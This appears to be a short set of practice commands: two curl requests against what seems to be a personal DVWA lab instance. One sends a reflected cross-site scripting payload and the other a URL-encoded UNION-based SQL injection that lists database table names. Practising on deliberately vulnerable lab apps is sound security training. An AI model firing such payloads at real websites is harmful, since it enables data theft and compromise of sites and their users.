curl -I http://dvwa.scottymcandrew.com/vulnerabilities/xss_r/\?name\=<script>alert\('WHOOPS!'\)</script>
curl -I http://dvwa.scottymcandrew.com/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit#
